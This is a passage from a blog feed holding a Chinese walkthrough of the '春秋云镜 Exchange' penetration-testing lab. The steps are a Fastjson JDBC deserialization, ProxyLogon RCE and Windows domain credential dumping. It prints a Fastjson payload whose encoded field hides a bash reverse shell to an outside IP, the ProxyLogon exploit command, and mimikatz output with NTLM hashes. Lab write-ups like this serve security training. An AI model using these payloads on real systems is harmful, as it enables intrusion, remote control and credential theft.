class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=pollute).start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        threading.Thread(target=flag).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711358909908-a1783476-6a8b-4faf-8c85-38457f70af7c.png#averageHue=%23232428&clientId=ufe14a54f-09e6-4&from=paste&height=866&id=uc870ede5&originHeight=1732&originWidth=3264&originalType=binary&ratio=2&rotation=0&showTitle=false&size=438573&status=done&style=none&taskId=ub1960347-8eca-4edc-b823-fb361987af4&title=&width=1632" alt="image.png"></p>]]></content>
    
    
    <summary type="html">阿里云CTF</summary>
    
    
    
    <category term="WriteUp" scheme="http://boogipop.com/categories/WriteUp/"/>
    
    
    <category term="Writeup" scheme="http://boogipop.com/tags/Writeup/"/>
    
    <category term="CTF" scheme="http://boogipop.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜 Exchange Writeup</title>
    <link href="http://boogipop.com/2024/03/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Exchange%20Writeup/"/>
    <id>http://boogipop.com/2024/03/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Exchange%20Writeup/</id>
    <published>2024-03-19T14:54:15.078Z</published>
    <updated>2024-03-19T14:54:43.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>Fastjson-JDBC ATTACK、Exchange proxylogon RCE、Dsync 攻击、MISC</p><h1 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h1><p>靶场地址：39.99.233.132<br>上手fscan嗦一把。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697723101130-887b522b-4df1-462f-8490-1b3f6b7ca342.png#averageHue=%2350545f&clientId=u1a62b496-940b-4&from=paste&height=352&id=ubf752d11&originHeight=440&originWidth=1471&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=874465&status=done&style=none&taskId=ub034b441-c071-46cb-8166-88fd62a4639&title=&width=1176.8" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                     fscan version: 1.7.1</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 39.99.233.132   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">39.99.233.132:80 open</span><br><span class="line">39.99.233.132:8000 open</span><br><span class="line">39.99.233.132:22 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http://39.99.233.132      code:200 len:19813  title:lumia</span><br><span class="line">[*] WebTitle:http://39.99.233.132:8000 code:302 len:0      title:None 跳转url: http://39.99.233.132:8000/login.html</span><br><span class="line">[*] WebTitle:http://39.99.233.132:8000/login.html code:200 len:5662   title:Lumia ERP</span><br></pre></td></tr></table></figure><p>发现了华夏ERP开在了8000端口<br><a href="https://cn-sec.com/archives/1798444.html">华夏erp账号密码泄露+后台rce（最新组合漏洞)</a><br><code>[http://39.99.233.132:8000/user/getAllList;.ico](http://39.99.233.132:8000/user/getAllList;.ico)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697723282880-f550b19b-766f-44b3-8cc0-f1f8584da52a.png#averageHue=%23f7f7f7&clientId=u1a62b496-940b-4&from=paste&height=649&id=u66ea67a6&originHeight=811&originWidth=1064&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28798&status=done&style=none&taskId=u61a8e819-f358-41fb-86c4-3d1f0f96fd6&title=&width=851.2" alt="image.png"><br>这里可以获取1管理员的账号密码，cmd5解密是123456<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697723300430-b80d96f0-98c7-488d-b68e-c744280755c5.png#averageHue=%23bdd3c1&clientId=u1a62b496-940b-4&from=paste&height=212&id=u8083363d&originHeight=265&originWidth=767&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8988&status=done&style=none&taskId=u2a58e14c-e62c-4cbb-8ae2-00325d39409&title=&width=613.6" alt="image.png"><br>获得一组管理员账号密码admin&#x2F;123456<br><a href="https://www.cnblogs.com/bmjoker/p/14856437.html">https://www.cnblogs.com/bmjoker/p/14856437.html</a><br>后台搜索界面存在fastjson1.2.55的反序列化，然后题目给的考点是JDBC，去找点poc。<br><a href="https://su18.org/post/fastjson/#8-fastjson-1268">https://su18.org/post/fastjson/#8-fastjson-1268</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">&quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,</span><br><span class="line">&quot;hostToConnectTo&quot;: &quot;114.116.119.253&quot;,</span><br><span class="line">&quot;portToConnectTo&quot;: 3306,</span><br><span class="line">&quot;url&quot;: &quot;jdbc:mysql://114.116.119.253:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">&quot;databaseToConnectTo&quot;: &quot;test&quot;,</span><br><span class="line">&quot;info&quot;: &#123;</span><br><span class="line">&quot;@type&quot;: &quot;java.util.Properties&quot;,</span><br><span class="line">&quot;PORT&quot;: &quot;3306&quot;,</span><br><span class="line">&quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">&quot;autoDeserialize&quot;: &quot;true&quot;,</span><br><span class="line">&quot;user&quot;: &quot;base64ZGVzZXJfQ0MzMV9iYXNoIC1jIHtlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNVFF1TVRFMkxqRXhPUzR5TlRNdk56YzNOeUF3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9&quot;,</span><br><span class="line">&quot;PORT.1&quot;: &quot;3306&quot;,</span><br><span class="line">&quot;HOST.1&quot;: &quot;172.20.64.40&quot;,</span><br><span class="line">&quot;NUM_HOSTS&quot;: &quot;1&quot;,</span><br><span class="line">&quot;HOST&quot;: &quot;172.20.64.40&quot;,</span><br><span class="line">&quot;DBNAME&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /user/list?search=%7B%0A%09%22%40type%22%3A%20%22java.lang.AutoCloseable%22%2C%0A%09%22%40type%22%3A%20%22com.mysql.jdbc.JDBC4Connection%22%2C%0A%09%22hostToConnectTo%22%3A%20%22114.116.119.253%22%2C%0A%09%22portToConnectTo%22%3A%203308%2C%0A%09%22url%22%3A%20%22jdbc%3Amysql%3A%2F%2F114.116.119.253%3A3308%2Ftest%3FautoDeserialize%3Dtrue%26statementInterceptors%3Dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%22%2C%0A%09%22databaseToConnectTo%22%3A%20%22test%22%2C%0A%09%22info%22%3A%20%7B%0A%09%09%22%40type%22%3A%20%22java.util.Properties%22%2C%0A%09%09%22PORT%22%3A%20%223306%22%2C%0A%09%09%22statementInterceptors%22%3A%20%22com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%22%2C%0A%09%09%22autoDeserialize%22%3A%20%22true%22%2C%0A%09%09%22user%22%3A%20%22base64ZGVzZXJfQ0MzMV9iYXNoIC1jIHtlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNVFF1TVRFMkxqRXhPUzR5TlRNdk56YzNOeUF3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9%22%2C%0A%09%09%22PORT.1%22%3A%20%223306%22%2C%0A%09%09%22HOST.1%22%3A%20%22172.20.64.40%22%2C%0A%09%09%22NUM_HOSTS%22%3A%20%221%22%2C%0A%09%09%22HOST%22%3A%20%22172.20.64.40%22%2C%0A%09%09%22DBNAME%22%3A%20%22test%22%0A%09%7D%0A%7D&amp;currentPage=1&amp;pageSize=10 HTTP/1.1</span><br><span class="line">Host: 39.99.233.132:8000</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://39.99.233.132:8000/login.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: JSESSIONID=B49FB20B635BD8913377199CAAED066E; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1697723127; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1697724188</span><br><span class="line">If-Modified-Since: Sun, 23 Oct 2022 11:30:06 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697724298044-2fcaa9ab-2ccd-46a7-bb85-88301dafc7c0.png#averageHue=%232a2826&clientId=uad691b33-cfb0-4&from=paste&height=370&id=u16c0c262&originHeight=462&originWidth=1438&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=73228&status=done&style=none&taskId=uc646fc54-db2e-4916-84bc-39b8c8e162a&title=&width=1150.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697724292625-4557279f-791f-4d39-b0ca-8259e1c8904e.png#averageHue=%23393838&clientId=uad691b33-cfb0-4&from=paste&height=346&id=ue431ec58&originHeight=432&originWidth=1106&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37478&status=done&style=none&taskId=u0d4f7707-a8ca-41ea-a958-1a218ae1750&title=&width=884.8" alt="image.png"><br>获取到了一个webshell。接下来咱们想给他持久化一下。我选择上个vshell<br>先拿个flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697724420802-e66dbaa5-52d4-41d3-89a2-396979c041cd.png#averageHue=%23474645&clientId=uad691b33-cfb0-4&from=paste&height=310&id=uab926e97&originHeight=388&originWidth=1146&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26106&status=done&style=none&taskId=u484040db-57b6-448e-962e-b3a581fb3ca&title=&width=916.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697724510936-b0ae05eb-fb9d-4e87-8819-7fab2eb01d8a.png#averageHue=%23343332&clientId=uad691b33-cfb0-4&from=paste&height=178&id=u9b7bf66c&originHeight=223&originWidth=988&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19199&status=done&style=none&taskId=u03570bb5-fbe8-4325-9776-7132f8cad21&title=&width=790.4" alt="image.png"><br>然后咱们在vhsell上等待服务器的上线即可。</p><h1 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697724580852-d7e304f1-e7bf-4a93-938c-bcda5770decb.png#averageHue=%23fbfbfb&clientId=uad691b33-cfb0-4&from=paste&height=76&id=u71932960&originHeight=95&originWidth=2265&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11803&status=done&style=none&taskId=u1b324f5b-f7bb-4cfa-8851-091942f7df6&title=&width=1812" alt="image.png"><br>上线过后我们首先上传个fscan上去进行后渗透。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697724707909-acb82489-85ba-4757-a8a1-460c4b757dc2.png#averageHue=%232d313a&clientId=uad691b33-cfb0-4&from=paste&height=298&id=ua8522b8d&originHeight=372&originWidth=1109&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39882&status=done&style=none&taskId=uaac6c151-8ccc-453b-8bb9-c3a26107d20&title=&width=887.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697724738121-64edb7de-3ca9-4f3c-95b5-d9355e8b010a.png#averageHue=%232f333d&clientId=uad691b33-cfb0-4&from=paste&height=160&id=u9b48b4d6&originHeight=200&originWidth=1402&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31231&status=done&style=none&taskId=u062bc181-2dfa-4c74-bc2e-e3ca2da5a03&title=&width=1121.6" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] 172.22.3.9           XIAORANG\XIAORANG-EXC01    Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle:http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html</span><br><span class="line">[*] WebTitle:http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP</span><br><span class="line">[*] WebTitle:http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。</span><br><span class="line">[*] WebTitle:https://172.22.3.9:8172   code:404 len:0      title:None</span><br><span class="line">[*] WebTitle:http://172.22.3.9         code:403 len:0      title:None</span><br><span class="line">[*] WebTitle:https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/</span><br><span class="line">[*] WebTitle:https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason=0 code:200 len:28237  title:Outlook</span><br></pre></td></tr></table></figure><p><code>https://172.22.3.9</code><br>我们看到了一个Outlook，结合靶机名称考虑的是Exchange的logon写shell的洞<br>但在这之前我们首先穿一层代理出来先，vshell提供了方便的隧道搭建，我们开一层socks5，然后配置一下自己的proxychains<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697725138497-9d72b3fc-c32d-43fa-b47d-50c2b8305f7f.png#averageHue=%23535760&clientId=uad691b33-cfb0-4&from=paste&height=210&id=u73ddbfa4&originHeight=263&originWidth=1161&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=437233&status=done&style=none&taskId=u740cbd60-9ebe-4c88-a34b-e9e19dcea26&title=&width=928.8" alt="image.png"><br>配置完毕，咱们掏出exp去打！<br><a href="https://github.com/hausec/ProxyLogon">https://github.com/hausec/ProxyLogon</a><br>python2去用这个exp。<br><code>proxychains python2 exchange-rce.py 172.22.3.9 administrator@xiaorang.lab</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697726076725-80564697-7587-4144-b209-5a05f33b3bf9.png#averageHue=%23545861&clientId=uad691b33-cfb0-4&from=paste&height=463&id=ubd5d6651&originHeight=579&originWidth=1525&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1165714&status=done&style=none&taskId=ue0f71be0-a967-4111-9200-1a4a905297f&title=&width=1220" alt="image.png"><br>但是这样始终不方便拿shell。所以启动一下蚁剑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697726783381-db638f6a-f53e-433d-a110-317dc53204dc.png#averageHue=%23eeeeee&clientId=uad691b33-cfb0-4&from=paste&height=357&id=uf622c99c&originHeight=446&originWidth=734&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26721&status=done&style=none&taskId=u91056ef0-a8af-4a9d-b07c-2df6481c833&title=&width=587.2" alt="image.png"><br>记得开忽略https证书捏<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697726873793-4b4253cb-5d8c-460e-abd9-78537f3d17af.png#averageHue=%23f7f7f7&clientId=uad691b33-cfb0-4&from=paste&height=654&id=ue1a4e3c4&originHeight=817&originWidth=1275&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52026&status=done&style=none&taskId=ubbbe9f69-4ae9-47be-9573-ef21e8e0006&title=&width=1020" alt="image.png"><br>然后进一步我们需要做个权限维持。也是上vshell，但是不出网。所以只能用蚁剑来办事情。</p><h1 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h1><p>windows域渗透的流程，首先我们当前用户是一个system高权限账号，是可以直接进行mimiktaz的操作的。先fscan扫一下，然后顺路把mimikatz也传上去<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697727297046-e3baf15f-4b76-4aba-b351-751c6f507a6d.png#averageHue=%23f2eded&clientId=uad691b33-cfb0-4&from=paste&height=305&id=u4738cd1d&originHeight=381&originWidth=977&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40435&status=done&style=none&taskId=u0c3cfbdc-474a-4409-8a38-78b573749a1&title=&width=781.6" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br></pre></td><td class="code"><pre><span class="line">C:\迅雷下载&gt; type 1.log</span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061</span><br><span class="line">mimikatz(commandline) # sekurlsa::logonpasswords</span><br><span class="line">Authentication Id : 0 ; 2394476 (00000000:0024896c)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2023/10/19 21:46:20</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : Zhangtong</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line">     * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line">     * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : Zhangtong</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : Zhangtong</span><br><span class="line">     * Domain   : XIAORANG.LAB</span><br><span class="line">     * Password : (null)</span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 104787 (00000000:00019953)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2023/10/19 21:44:10</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : Zhangtong</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line">     * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line">     * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : Zhangtong</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : Zhangtong</span><br><span class="line">     * Domain   : XIAORANG.LAB</span><br><span class="line">     * Password : (null)</span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 104855 (00000000:00019997)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2023/10/19 21:44:10</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">    msv :    </span><br><span class="line">     